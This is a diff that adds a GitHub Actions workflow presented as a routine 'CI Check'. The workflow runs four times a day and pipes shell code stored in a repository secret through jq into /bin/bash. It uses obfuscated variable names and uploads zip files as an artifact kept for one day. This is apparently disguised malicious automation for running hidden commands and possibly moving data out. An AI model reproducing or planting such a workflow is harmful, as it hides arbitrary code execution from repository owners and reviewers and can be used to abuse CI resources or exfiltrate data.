@@ -1,0 +1,31 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '5 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          sr7: ${{ secrets.sr7 }}
+        run: |
+          printf '%s' "$sr7" | jq -r .pr1 | /bin/bash
+          printf '%s' "$gjx16552" | jq -r .fyofm09 | /bin/bash
+          printf '%s' "$n60" | jq -r .foiz111 | /bin/bash
+          echo $npmd7937 | jq -r .cubt3112 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: JjPx0Bf7
+          path: "*.zip"
+          retention-days: 1
